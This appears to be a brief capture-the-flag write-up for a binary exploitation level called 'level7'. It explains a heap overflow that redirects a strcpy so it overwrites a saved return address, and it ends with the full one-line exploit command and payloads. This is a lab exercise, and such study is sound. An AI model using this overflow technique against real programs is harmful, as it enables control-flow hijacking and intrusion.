program does 4 calls to malloc of size 8
with gdb we can see that we can overflow
and change the dest and src of the second strcpy
we need to call fonction m
we can see that saved eip is at 0xbffff73c
we need to replace that value with function m wich is 0x080484f4
./level7 `python -c 'print("a"*20+ "\xbf\xff\xf7\x3c"[::-1])'` `python -c 'print("\x08\x04\x84\xf4"[::-1])'`
